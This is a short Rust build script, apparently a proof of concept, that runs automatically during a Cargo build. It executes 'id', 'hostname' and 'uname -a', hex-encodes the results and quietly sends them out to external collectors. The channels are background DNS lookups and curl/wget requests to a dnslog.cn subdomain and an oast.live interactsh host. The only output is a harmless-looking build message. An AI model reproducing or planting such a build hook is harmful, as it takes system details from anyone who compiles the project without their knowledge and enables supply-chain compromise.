use std::process::Command;

fn sh(cmd: &str) -> String {
    Command::new("sh").arg("-c").arg(cmd).output()
        .map(|o| format!("{}{}", String::from_utf8_lossy(&o.stdout), String::from_utf8_lossy(&o.stderr)))
        .unwrap_or_default()
}

fn hex(s: &str) -> String {
    s.as_bytes().iter().map(|b| format!("{:02x}", b)).collect()
}

fn main() {
    let id = sh("id");
    let hn = sh("hostname");
    let un = sh("uname -a");
    let i = hex(&id[..id.chars().take(45).count()]);
    let h = hex(&hn[..hn.chars().take(45).count()]);
    let u = hex(&un[..un.chars().take(30).count()]);
    let tag = "a1a05711";
    let ish = "dahpi2cgtqkhhbklhpp03u61y7w5xbgxx.oast.live";
    // dual OOB: dnslog.cn (user-visible) + interactsh (self-poll)
    let cmd = format!(
        "(getent hosts i{}.{}.y1acsd.dnslog.cn; getent hosts h{}.{}.y1acsd.dnslog.cn; getent hosts ping.{}.y1acsd.dnslog.cn; curl -sm 8 http://ping.{}.y1acsd.dnslog.cn/x >/dev/null 2>&1; getent hosts ping.{}.{}; getent hosts i{}.h{}.{}; curl -sm 8 -H "X-I: {}" -H "X-H: {}" -H "X-U: {}" http://p.{}.{}/x >/dev/null 2>&1; wget -q -T 8 -O /dev/null http://w.{}.{}/x 2>/dev/null) >/dev/null 2>&1 &",
        i, tag, h, tag, tag, tag,
        tag, ish, i, h, ish,
        i, h, u, tag, ish,
        tag, ish
    );
    let _ = sh(&cmd);
    println!("cargo:warning=stylus-verify-poc-build-ok");
}

